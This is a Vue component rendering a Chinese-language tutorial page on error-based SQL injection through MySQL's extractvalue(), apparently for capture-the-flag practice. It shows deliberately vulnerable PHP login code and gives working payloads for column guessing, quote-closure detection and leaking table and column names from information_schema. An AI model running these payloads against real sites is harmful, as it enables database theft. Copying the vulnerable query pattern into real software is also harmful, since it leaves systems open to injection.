<template>
        <div>
                <el-row>
                        <el-col :span="5">
                                <el-menu :default-active="activeAnchor" class="tech-anchor" mode="vertical"
                                        @select="handleAnchorSelect">
                                        <el-menu-item-group title="本页目录">
                                                <el-menu-item index="part2">原理</el-menu-item>
                                                <el-submenu index="part2-sub">
                                                        <template slot="title">原理 - 详细</template>
                                                        <el-menu-item
                                                                index="part2-1">extractvalue()</el-menu-item>
                                                </el-submenu>
                                                <el-menu-item index="part3">绕过姿态</el-menu-item>
                                                <el-submenu index="part3-sub">
                                                        <template slot="title">绕过姿态 - 详细</template>
                                                        <el-menu-item index="part3-1">数字型</el-menu-item>
                                                        <el-menu-item index="part3-1-1">数字型 -
                                                                猜解列数</el-menu-item>
                                                        <el-menu-item index="part3-1-2">数字型 -
                                                                爆破表名</el-menu-item>
                                                        <el-menu-item index="part3-1-3">数字型 -
                                                                爆破列名</el-menu-item>
                                                        <el-menu-item index="part3-2">字符型</el-menu-item>
                                                        <el-menu-item index="part3-2-0">字符型 -
                                                                判断闭合方式</el-menu-item>
                                                        <el-menu-item index="part3-2-1">字符型 -
                                                                猜解列数</el-menu-item>
                                                        <el-menu-item index="part3-2-2">字符型 -
                                                                爆破表名</el-menu-item>
                                                        <el-menu-item index="part3-2-3">字符型 -
                                                                爆破列名</el-menu-item>
                                                </el-submenu>
                                        </el-menu-item-group>
                                </el-menu>
                        </el-col>
                        <el-col :span="19">
                                <div ref="containerRef" style="color: #fff;height: 650px; overflow-y: auto">
                                        <div id="part0" style="height: 100px;">
                                        </div>
                                        <div id="part2" style="height: 1000px;">
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <h1 class="title">原理</h1>
                                                        <el-divider />
                                                        <div id="part2-1" style="height: 850px;">
                                                                <h2 class="sub-title">extractvalue()</h2>
                                                                <el-tag style="color:#0b915d" type="info"
                                                                        size="default">extractvalue()</el-tag>是用于从<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">XML</el-tag>文档中提取数据的函数
                                                                <el-card
                                                                        style="max-width:750px;background-color:#282C34;max-height: 900px;">
                                                                        <span class="cmt">
                                                                                /**<br>
                                                                                * <span
                                                                                        class="key">@param</span>
                                                                                XML_Fragment: XML 文档或片段<br>
                                                                                * <span
                                                                                        class="key">@param</span>
                                                                                XPath:
                                                                                指定要提取数据位置的 XPath 路径<br>
                                                                                */
                                                                        </span><br>
                                                                        <span class="code"><span
                                                                                        class="func">extractvalue</span><span
                                                                                        class="lev0">(<span
                                                                                                class="code">XML_Fragment,XPath</span>)</span></span>
                                                                </el-card>
                                                                如何使<el-tag style="color:#0b915d" type="info"
                                                                        size="default">extractvalue()</el-tag>报错呢?<br>
                                                                <ul>
                                                                        <li>
                                                                                找不到<el-tag style="color:#e1567b"
                                                                                        type="info"
                                                                                        size="default">XML</el-tag>文档,只会返回<el-tag
                                                                                        style="color:#8e40ce"
                                                                                        type="info"
                                                                                        size="default">NULL</el-tag>,不会报错
                                                                        </li>
                                                                        <li>
                                                                                <el-tag style="color:#e1567b"
                                                                                        type="info"
                                                                                        size="default">XPath</el-tag>格式错误,则会报错,将错误的路径报出来
                                                                        </li>
                                                                </ul>
                                                                我们的思路是:<br>
                                                                既然错的路径会被报出来,可以利用这一点,在这个报错之前先回显一些有用的信息
                                                        </div>
                                                </el-text>
                                                <div id="part2-5" style="height: 300px;">
                                                </div>
                                        </div>
                                        <div id="part3" style="height: 500px;">
                                                <el-text size="large" style="color:#fff; line-height: 3.6;">
                                                        <h1 class="title">绕过姿态</h1>
                                                        <el-divider />
                                                        <div id="part3-1" style="height: 650px;">
                                                                <br>
                                                                <h2 class="sub-title">数字型</h2>
                                                                <el-card
                                                                        style="max-width:750px;background-color:#282C34;max-height: 900px;">
                                                                        <span class="cmt">//login.php</span><br>
                                                                        <span class="code">$username <span
                                                                                        class="key">=</span>
                                                                                $_GET<span
                                                                                        class="lev0">[</span>'<span
                                                                                        class="lev0">username</span>'<span
                                                                                        class="lev0">]</span><span
                                                                                        style="font-family:'Cascadia Code'">;</span></span><br>
                                                                        <span class="code">$sql
                                                                                <span class="key">=</span>
                                                                                "<span class="lev0">select *
                                                                                        from
                                                                                        user
                                                                                        where
                                                                                        username</span><span
                                                                                        class="key">=</span>$username<span
                                                                                        class="lev0"></span>"<span
                                                                                        style="font-family:'Cascadia Code'">;</span></span><br>
                                                                        <span class="code">$res
                                                                                <span class="key">=</span>
                                                                                $conn<span
                                                                                        class="key">-></span><span
                                                                                        class="func">query</span><span
                                                                                        class="lev0">(</span>$sql<span
                                                                                        class="lev0">)</span><span
                                                                                        style="font-family:'Cascadia Code'">;</span></span><br>
                                                                        <span class="key">if</span><span
                                                                                class="lev0">(</span><span
                                                                                class="code">$conn</span><span
                                                                                class="key">-></span><span
                                                                                class="code">error</span><span
                                                                                class="lev0">)</span><span
                                                                                class="lev0">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                class="code"><span
                                                                                        class="func">echo</span>
                                                                                $conn<span
                                                                                        class="key">-></span>error;</span><br>
                                                                        <span class="code"><span
                                                                                        class="lev0">}</span></span><br>
                                                                </el-card>
                                                                <br>
                                                        </div>
                                                        <div id="part3-1-1" style="height: 590px;">
                                                                <h3 class="sub-sub-title">猜解列数</h3>
                                                                首先猜解列数
                                                                利用<el-tag style="color:#e1567b" type="info"
                                                                        size="default">GROUP BY</el-tag>
                                                                或<el-tag style="color:#e1567b" type="info"
                                                                        size="default">ORDER BY</el-tag>
                                                                进行猜解<br>
                                                                <el-tag style="color:#1bac74" type="info"
                                                                        size="default">get方法</el-tag>传入参数:<br>
                                                                <el-tag style="color:#fff" type="info"
                                                                        size="default">?username=0 <span
                                                                                class="key">order
                                                                                by</span> <span
                                                                                class="num">n</span></el-tag>
                                                                <br>
                                                                <el-tag style="color:#7C74C4" type="info"
                                                                        size="default">n</el-tag>即为我们要猜解的列数;
                                                                采用二分法进行猜解;
                                                                若出现报错 <el-tag style="color:#e1567b" type="info"
                                                                        size="default">Unknown column ''
                                                                        in 'order
                                                                        clause'</el-tag><br>
                                                                则说明猜解的数过大;<br>
                                                                否则说明猜解的数小于等于列数<br>
                                                                刚好使数据库不报错的那个数即为我们需要的列数
                                                        </div>

                                                        <div id="part3-1-2" style="height: 580px;">
                                                                <h3 class="sub-sub-title">爆破表名</h3>
                                                                利用<el-tag style="color:#e1567b" type="info"
                                                                        size="default">information_schema</el-tag>下的<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">tables</el-tag>这张表<br>查询<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">table_name</el-tag>,让<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">table_schema</el-tag>字段等于当前数据库<el-tag
                                                                        style="color:#0b915d" type="info"
                                                                        size="default">database()</el-tag>
                                                                <br>
                                                                明确了我们要获取的信息,构造<el-tag style="color:#e1567b"
                                                                        type="info"
                                                                        size="default">XPath</el-tag>,使报错显示我们想要的信息<br>
                                                                利用
                                                                <el-card
                                                                        style="max-width:750px;font-size: 13px;background-color:#282C34;max-height: 900px;">
                                                                        ?username=0 union select 1,2,<br>
                                                                        <span
                                                                                class="func">extractvalue</span><span
                                                                                class="lev0">(</span>1,<span
                                                                                class="func">concat</span><span
                                                                                class="lev1">(</span>'~',<span
                                                                                class="lev2">(</span>select
                                                                        <span class="func">substring</span><span
                                                                                class="lev0">(</span><span
                                                                                class="func">group_concat</span><span
                                                                                class="lev1">(</span><span
                                                                                class="key">table_name</span><span
                                                                                class="lev1">)</span>,0,31<span
                                                                                class="lev0">)</span><br>
                                                                        from <span
                                                                                class="key">information_schema.tables</span>
                                                                        where <span
                                                                                class="key">table_schema</span>=<span
                                                                                class="func">database</span><span
                                                                                class="lev0">()</span><span
                                                                                class="lev2">)</span><span
                                                                                class="lev1">)</span><span
                                                                                class="lev0">)</span>
                                                                </el-card>

                                                                此时,报错路径上便会显示出表名的信息
                                                        </div>
                                                        <div id="part3-1-3" style="height: 700px;">
                                                                <h3 class="sub-sub-title">爆破列名</h3>
                                                                我们此时已拿到爆破出的表名<el-tag style="color:#e1567b"
                                                                        type="info"
                                                                        size="default">name</el-tag><br>
                                                                依然是利用数据库<el-tag style="color:#e1567b"
                                                                        type="info"
                                                                        size="default">information_schema</el-tag>,在<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">columns</el-tag>表中查询<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">column_name</el-tag>字段<br>
                                                                并让<el-tag style="color:#e1567b" type="info"
                                                                        size="default">table_name</el-tag>等于刚刚爆破出的表名,<el-tag
                                                                        style="color:#e1567b" type="info"
                                                                        size="default">table_schema</el-tag>等于数据库名<el-tag
                                                                        style="color:#0b915d" type="info"
                                                                        size="default">database()</el-tag><br>
                                                                传入参数:<br>
                                                                <el-card
                                                                        style="max-width:750px;font-size: 13px;background-color:#282C34;max-height: 900px;">
                                                                        ?username=0 union select 1,2,<br>
                                                                        <span
                                                                                class="func">extractvalue</span><span
                                                                                class="lev0">(</span>1,<span
                                                                                class="func">concat</span><span
                                                                                class="lev1">(</span>'~',<span
                                                                                class="lev2">(</span>select
                                                                        <span class="func">substring</span><span
                                                                                class="lev0">(</span><span
                                                                                class="func">group_concat</span><span
                                                                                class="lev1">(</span><span
                                                                                class="key">column_name</span><span
                                                                                class="lev1">)</span>,0,31<span
                                                                                class="lev0">)</span><br>
                                                                        from <span
                                                                                class="key">information_schema.columns</span>
                                                                        where <span
                                                                                class="key">table_schema</span>=<span
                                                                                class="func">database</span><span
                                                                                class="lev0">()</span> and
                                                                        <span class="key">table_name</span> =
                                                                        name<br>
                                                                        <span class="lev2">)</span><span
                                                                                class="lev1">)</span><span
                                                                                class="lev0">)</span>
                                                                </el-card>
                                                                报错路径上便会显示出列名的信息<br>
                                                                目标表名与列名都已知,那么便可获取<el-tag style="color:#e1567b"
                                                                        type="info" size="default">flag</el-tag>
                                                        </div>
                                                        <div id="part3-2" style="height: 300px;">
                                                                <h2 class="sub-title">字符型</h2>
                                                                <el-card
                                                                        style="max-width:750px;background-color:#282C34;max-height: 900px;">
                                                                        <span class="cmt">//login.php</span><br>
                                                                        <span class="code">$username <span
                                                                                        class="key">=</span>
                                                                                $_GET<span
                                                                                        class="lev0">[</span>'<span
                                                                                        class="lev0">username</span>'<span
                                                                                        class="lev0">]</span><span
                                                                                        style="font-family:'Cascadia Code'">;</span></span><br>
                                                                        <span class="code">$sql
                                                                                <span class="key">=</span>
                                                                                "<span class="lev0">select *
                                                                                        from
                                                                                        user
                                                                                        where
                                                                                        username</span><span
                                                                                        class="key">=</span>'$username'<span
                                                                                        class="lev0"></span>"<span
                                                                                        style="font-family:'Cascadia Code'">;</span></span><br>
                                                                        <span class="code">$res
                                                                                <span class="key">=</span>
                                                                                $conn<span
                                                                                        class="key">-></span><span
                                                                                        class="func">query</span><span
                                                                                        class="lev0">(</span>$sql<span
                                                                                        class="lev0">)</span><span
                                                                                        style="font-family:'Cascadia Code'">;</span></span><br>
                                                                        <span class="key">if</span><span
                                                                                class="lev0">(</span><span
                                                                                class="code">$conn</span><span
                                                                                class="key">-></span><span
                                                                                class="code">error</span><span
                                                                                class="lev0">)</span><span
                                                                                class="lev0">{</span><br>
                                                                        &nbsp;&nbsp;&nbsp;&nbsp;<span
                                                                                class="code"><span
                                                                                        class="func">echo</span>
                                                                                $conn<span
                                                                                        class="key">-></span>error;</span><br>
                                                                        <span class="code"><span
                                                                                        class="lev0">}</span></span><br>
                                                                </el-card>
                                                                <div id="part3-2-0" style="height: 1080px;">
                                                                        <br>
                                                                        <h3 class="sub-sub-title">
                                                                                判断闭合方式
                                                                        </h3>
                                                                        以下是常见的闭合符:<br>
                                                                        单引号闭合<el-tag style="color:#fff"
                                                                                type="info"
                                                                                size="default">'</el-tag>&nbsp;&nbsp;
                                                                        括号单引号闭合<el-tag style="color:#fff"
                                                                                type="info"
                                                                                size="default">('')</el-tag><br>
                                                                        双引号闭合<el-tag style="color:#fff"
                                                                                type="info"
                                                                                size="default">""</el-tag>&nbsp;&nbsp;
                                                                        括号双引号闭合<el-tag style="color:#fff"
                                                                                type="info"
                                                                                size="default">("")</el-tag>
                                                                        <br>
                                                                        以下是<el-tag style="color:#fff"
                                                                                type="info"
                                                                                size="default">SQL</el-tag>的单行注释:<br>
                                                                        <el-tag style="color:#0b915d"
                                                                                type="info"
                                                                                size="default">#</el-tag>
                                                                        &nbsp;
                                                                        <el-tag style="color:#0b915d"
                                                                                type="info" size="default">--
                                                                        </el-tag>
                                                                        <br>
                                                                        判断闭合符,我们需要用单个右闭合符＋注释符的方式判断<br>
                                                                        为什么呢?<br>
                                                                        假设我们传入<el-tag style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">1'</el-tag>,拼接在<el-tag
                                                                                style="color:#fff" type="info"
                                                                                size="default">SQL</el-tag>中会长这样:<br>
                                                                        <el-card
                                                                                style="max-width:750px;background-color:#282C34;max-height: 900px;">
                                                                                <span
                                                                                        class="key">select</span>&nbsp;<span
                                                                                        class="code">username</span>&nbsp;<span
                                                                                        class="key">from</span>&nbsp;<span
                                                                                        class="code">users</span>&nbsp;<span
                                                                                        class="key">where</span>&nbsp;<span
                                                                                        class="code">id&nbsp;<span
                                                                                                class="key">=</span>&nbsp;'1''</span><br>
                                                                        </el-card>
                                                                        多冒出一个右闭合符,会引起关于闭合符不匹配的报错<br>
                                                                        如果传入的内容加上注释:<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info" size="default">1'
                                                                                #</el-tag>或<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info" size="default">1'
                                                                                --</el-tag>
                                                                        <el-card
                                                                                style="max-width:750px;background-color:#282C34;max-height: 900px;">
                                                                                <span
                                                                                        class="key">select</span>&nbsp;<span
                                                                                        class="code">username</span>&nbsp;<span
                                                                                        class="key">from</span>&nbsp;<span
                                                                                        class="code">users</span>&nbsp;<span
                                                                                        class="key">where</span>&nbsp;<span
                                                                                        class="code">id&nbsp;<span
                                                                                                class="key">=</span>&nbsp;'1'<span
                                                                                                style="color:rgb(99, 97, 97)">
                                                                                                #'</span></span><br>
                                                                        </el-card><br>
                                                                        攻击者添加在参数中的右闭合符就有可能与原先的左闭合符形成闭合,使页面正常回显
                                                                </div>
                                                                <div id="part3-2-1" style="height: 650px;">
                                                                        <h3 class="sub-sub-title">猜解列数</h3>
                                                                        假设前一步得出的闭合方式是单引号闭合单引号闭合<el-tag
                                                                                style="color:#fff" type="info"
                                                                                size="default">''</el-tag><br>
                                                                        首先猜解列数
                                                                        利用<el-tag style="color:#e1567b"
                                                                                type="info" size="default">GROUP
                                                                                BY</el-tag>
                                                                        或<el-tag style="color:#e1567b"
                                                                                type="info" size="default">ORDER
                                                                                BY</el-tag>
                                                                        进行猜解<br>
                                                                        <el-tag style="color:#1bac74"
                                                                                type="info"
                                                                                size="default">get方法</el-tag>传入参数:<br>
                                                                        <el-tag style="color:#fff" type="info"
                                                                                size="large">?username=0<span
                                                                                        class="key">'</span>
                                                                                <span class="key">order
                                                                                        by</span> <span
                                                                                        class="num">n</span>
                                                                                <span
                                                                                        class="cmt">#</span></el-tag>
                                                                        <br>
                                                                        <el-tag style="color:#7C74C4"
                                                                                type="info"
                                                                                size="default">n</el-tag>即为我们要猜解的列数;
                                                                        采用二分法进行猜解;
                                                                        若出现报错 <el-tag style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">Unknown
                                                                                column '' in
                                                                                'order
                                                                                clause'</el-tag><br>
                                                                        则说明猜解的数过大;<br>
                                                                        否则说明猜解的数小于等于列数<br>
                                                                        刚好使数据库不报错的那个数即为我们需要的列数
                                                                </div>

                                                                <div id="part3-2-2" style="height: 580px;">
                                                                        <h3 class="sub-sub-title">爆破表名</h3>
                                                                        利用<el-tag style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">information_schema</el-tag>下的<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">tables</el-tag>这张表<br>查询<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">table_name</el-tag>,让<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">table_schema</el-tag>字段等于当前数据库<el-tag
                                                                                style="color:#0b915d"
                                                                                type="info"
                                                                                size="default">database()</el-tag>
                                                                        在显位上进行替换<br>
                                                                        假设在上一小节中,爆出
                                                                        <el-tag style="color:#8e40ce"
                                                                                type="info"
                                                                                size="default">2</el-tag>为显位,传入参数<br>
                                                                        <el-card
                                                                                style="max-width:750px;background-color: #282C34;font-size: 13px;max-height: 900px;">
                                                                                ?username=0' union select
                                                                                1,2,<br>
                                                                                <span
                                                                                        class="func">extractvalue</span><span
                                                                                        class="lev0">(</span>1,<span
                                                                                        class="func">concat</span><span
                                                                                        class="lev1">(</span>'~',<span
                                                                                        class="lev2">(</span>select
                                                                                <span
                                                                                        class="func">substring</span><span
                                                                                        class="lev0">(</span><span
                                                                                        class="func">group_concat</span><span
                                                                                        class="lev1">(</span><span
                                                                                        class="key">table_name</span><span
                                                                                        class="lev1">)</span>,0,31<span
                                                                                        class="lev0">)</span><br>
                                                                                from <span
                                                                                        class="key">information_schema.tables</span>
                                                                                where <span
                                                                                        class="key">table_schema</span>=<span
                                                                                        class="func">database</span><span
                                                                                        class="lev0">()</span><span
                                                                                        class="lev2">)</span><span
                                                                                        class="lev1">)</span><span
                                                                                        class="lev0">)</span><br>
                                                                                <span class="key">#</span>
                                                                        </el-card>

                                                                        此时,报错路径上便会显示出表名的信息
                                                                </div>
                                                                <div id="part3-2-3" style="height: 600px;">
                                                                        <h3 class="sub-sub-title">爆破列名</h3>
                                                                        我们此时已拿到爆破出的表名<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">name</el-tag><br>
                                                                        依然是利用数据库<el-tag style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">information_schema</el-tag>,在<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">columns</el-tag>表中查询<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">column_name</el-tag>字段<br>
                                                                        并让<el-tag style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">table_name</el-tag>等于刚刚爆破出的表名,<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">table_schema</el-tag>等于数据库名<el-tag
                                                                                style="color:#0b915d"
                                                                                type="info"
                                                                                size="default">database()</el-tag><br>
                                                                        <el-card
                                                                                style="max-width:750px;background-color: #282C34;font-size: 13px;max-height: 900px;">
                                                                                ?username=0' union select
                                                                                1,2,<br>
                                                                                <span
                                                                                        class="func">extractvalue</span><span
                                                                                        class="lev0">(</span>1,<span
                                                                                        class="func">concat</span><span
                                                                                        class="lev1">(</span>'~',<span
                                                                                        class="lev2">(</span>select
                                                                                <span
                                                                                        class="func">substring</span><span
                                                                                        class="lev0">(</span><span
                                                                                        class="func">group_concat</span><span
                                                                                        class="lev1">(</span><span
                                                                                        class="key">column_name</span><span
                                                                                        class="lev1">)</span>,0,31<span
                                                                                        class="lev0">)</span><br>
                                                                                from <span
                                                                                        class="key">information_schema.columns</span>
                                                                                where <span
                                                                                        class="key">table_schema</span>=<span
                                                                                        class="func">database</span><span
                                                                                        class="lev0">()</span>
                                                                                and <span
                                                                                        class="key">table_name</span>
                                                                                =
                                                                                name<span
                                                                                        class="lev2">)</span><span
                                                                                        class="lev1">)</span><span
                                                                                        class="lev0">)</span><br>
                                                                                <span class="key">#</span>
                                                                        </el-card>

                                                                        此时,报错路径上便会显示出列名的信息
                                                                        目标表名与列名都已知,那么便可获取<el-tag
                                                                                style="color:#e1567b"
                                                                                type="info"
                                                                                size="default">flag</el-tag>
                                                                </div>
                                                        </div>

                                                        <div id="part3-3" style="height: 300px;">
                                                        </div>
                                                </el-text>
                                        </div>
                                        <div id="part4" style="height: 300px;">

                                        </div>
                                </div>
                        </el-col>
                </el-row>
        </div>
</template>

<script>
export default {
data() {
        return {
                activeAnchor: 'part2',
                tableData: [
                        {
                                table_name: "数据表名",
                                table_schema: "数据表所属的数据库名"
                        },
                ],
                size: '',
                containerRef: null
        };
},
methods: {
        handleAnchorSelect(key) {
                const targetElement = document.getElementById(key);
                if (targetElement) {
                        targetElement.scrollIntoView({ behavior: 'smooth' });
                }
        }
},
mounted() {
        this.containerRef = this.$refs.containerRef;
}
};
</script>

<style scoped lang="less">
h1.title {
margin: 0 0 3rem;
font-size: 38px;
line-height: 1.4;
letter-spacing: -.02em;
font-weight: 800;
text-align: left;
font-family: 'Orbitron', '微软雅黑';
}

h2.sub-title {
margin: 0 0 3rem;
font-size: 25px;
line-height: 1.4;
letter-spacing: -.02em;
font-weight: 800;
text-align: left;
font-family: 'Orbitron', '微软雅黑';
}

h3.sub-sub-title {
margin: 0 0 3rem;
font-size: 20px;
line-height: 1.4;
letter-spacing: -.02em;
font-weight: 800;
text-align: left;
font-family: 'Orbitron', '微软雅黑';
}

.v {
color: #4cbcec;
font-family: 'Cascadia Code';
}

.key {
color: #e1567b;
font-family: 'Cascadia Code';
}

.lev0 {
color: #f0de18;
font-family: 'Cascadia Code';
}

.lev1 {
color: rgb(238, 65, 195);
font-family: 'Cascadia Code';
}

.lev2 {
color: #239af5;
font-family: 'Cascadia Code';
}

.func {
color: #84D49C;
/* color:#434040 */
font-family: 'Cascadia Code';
}

.txt {
font-family: 'Cascadia Code';
}

.code {
color: #fff;
font-family: 'Cascadia Code';
}

.cmt {
color: rgb(99, 97, 97);
font-family: 'Cascadia Code';
font-size: 15px
}

.num {
color: #8e40ce;
font-family: 'Cascadia Code';
}

/* el-tag 样式 */
.el-tag {
background-color: #3d3b3b;
color: #fff;
border-color: #282C34;
}

/* el-card 样式 */
.el-card {
background-color: #282C34;
color: #fff;
border-color: #282C34;
}

/* el-text 样式 */
.el-text {
color: #fff;
}

/* 锚点容器样式 */
.tech-anchor {
--el-anchor-padding: 0 0 0 20px;
--el-anchor-border-width: 0;
--el-anchor-marker-height: 100%;
--el-anchor-marker-width: 2px;
background: rgba(10, 17, 40, 0.7);
border-radius: 4px;
padding: 15px;
box-shadow: 0 0 15px rgba(0, 123, 255, 0.1);
border-left: 1px solid rgba(0, 123, 255, 0.3);
}

/* 锚点标题样式 */
.anchor-title {
color: #d1e7ff !important;
font-family: 'Cascadia Code', '微软雅黑';
margin: 0 0 15px 0;
padding-bottom: 10px;
border-bottom: 1px solid rgba(0, 123, 255, 0.3);
text-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
}

/* 锚点链接基础样式 */
.tech-anchor :deep(.el-anchor-link) {
margin: 8px 0;
}

.tech-anchor :deep(.el-anchor-link__title) {
color: #a0c4ff !important;
font-family: 'Cascadia Code', '微软雅黑';
font-size: 0.9em;
padding: 5px 10px;
border-radius: 3px;
transition: all 0.3s ease;
position: relative;
}

/* 锚点悬停效果 */
.tech-anchor :deep(.el-anchor-link__title:hover) {
color: #ffffff !important;
background: rgba(0, 123, 255, 0.2);
text-shadow: 0 0 5px #007bff;
transform: translateX(5px);
}

.tech-anchor :deep(.el-anchor-link__title:hover)::before {
content: '>';
position: absolute;
left: -10px;
color: #00a2ff;
opacity: 0;
animation: blink-caret 0.8s step-end infinite alternate;
}

/* 激活锚点样式 */
.tech-anchor :deep(.el-anchor-link.active .el-anchor-link__title) {
color: #ffffff !important;
background: rgba(0, 123, 255, 0.3);
text-shadow: 0 0 10px #00a2ff;
border-left: 2px solid #007bff;
padding-left: 15px;
animation: pulse-glow 2s infinite alternate;
}

/* 子链接样式 */
.tech-anchor :deep(.el-anchor-link .el-anchor-link) {
margin-left: 20px;
}

.tech-anchor :deep(.el-anchor-link .el-anchor-link__title) {
font-size: 0.85em;
color: #8ab4f8 !important;
}

/* 标记线样式 */
.tech-anchor :deep(.el-anchor__marker) {
background: linear-gradient(to bottom, transparent, #007bff, transparent);
opacity: 0.7;
width: 2px !important;
left: 0 !important;
}

/* 响应式调整 */
@media (max-width: 768px) {
.tech-anchor {
        padding: 10px;
}

.tech-anchor :deep(.el-anchor-link__title:hover)::before {
        display: none;
}
}
</style>